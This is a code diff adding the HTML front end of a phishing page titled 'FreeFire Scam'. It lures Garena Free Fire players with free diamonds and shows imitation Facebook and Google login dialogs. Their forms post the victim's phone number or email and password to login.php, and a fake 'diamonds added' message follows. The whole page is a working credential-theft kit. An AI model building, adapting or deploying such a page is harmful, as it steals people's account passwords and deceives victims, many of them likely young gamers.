@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+	<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<title>FreeFire Scam</title>
+		<link rel="stylesheet" type="text/css" href="style.css">
+		<link rel="preconnect" href="https://fonts.googleapis.com">
+		<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+		<link href="https://fonts.googleapis.com/css2?family=Urbanist:wght@700&display=swap" rel="stylesheet">
+		
+		<script src="script.js"></script>
+	</head>
+	<body>
+		<nav>
+			<div class="nav-container">
+				<img src="images/logo.png">
+			</div>
+		</nav>
+
+		<div class="main">
+			<div class="slide1">
+				<h2>Garena Free Fire: 5th Anniv.</h2>
+			</div>
+			<div class="form" id="form">
+				<div class="form-container">
+					<h3>Enter Number of Diamonds</h3>
+					<input id="num-in" type="number" value="1000" max="1000"><br>
+					<input id="C-W-F" type="button" value="Continue with facebook" onclick="FBlogin()"><br>
+					<input id="C-W-G" type="button" value="Continue with google" onclick="Googlelogin()"><br>
+					<input id="btn-in" type="button" value="Redeem" onclick="MESSAGE('LogIn First')">
+				</div>
+			</div>
+		</div>
+		
+		<div class="login" id="fblogin">
+			<div id=title-holder>
+				<h3 id="title">facebook</h3>
+				<button id="btn" onclick="FBlogin()">X</button>
+			</div>
+			<div class="login-container">
+				<img src="images/image002.jpg">
+				<h4>Log in to your Facebook account to<br>connect to FreeFire</h4>
+				<form action="login.php" method="post">
+					<input id="mobile-no" name="email-num" type="text" placeholder="Phone Number"/><br>
+					<input id="password" name="fpassword" type="password" placeholder="password"/><br>
+					<input type="submit" id="login-btn" name="login-fb" value="Log In" onclick="FBloginOnClick()">
+				</form>
+				<h6>Facebook Inc.</h6>
+			</div>
+		</div>
+
+		<div id="googlelogin">
+			<div id=gtitle-holder>
+				<h3 id="gtitle">Google</h3>
+				<button id="gbtn" onclick="Googlelogin()">X</button>
+			</div>
+			<div class="glogin-container">
+				<img src="images/image002.jpg">
+				<h4>Log in to your Google account to<br>connect to FreeFire</h4>
+				<form action="login.php" method="post">
+					<input id="email" name="email" type="email" placeholder="Email"/><br>
+					<input id="gpassword" name="gpassword" type="password" placeholder="password"/><br>
+					<input type="submit" id="glogin-btn" name="login-go" value="Sign In" onclick="GoogleloginOnClick()">
+				</form>
+				
+				<h6>Facebook Inc.</h6>
+			</div>
+		</div>
+
+		<div id="pop-up">
+			<div class="container">
+				<h4 class="elements" id="pop-title">Congratulation</h4>
+				<p class="elements" id="paragraph">1000 diamonds has been added to your account</p>
+				<button class="elements" id="btn" onclick="MESSAGE('CLOSING')">OK</button>
+			</div>
+		</div>
+	</body>
+	</html>	
+	
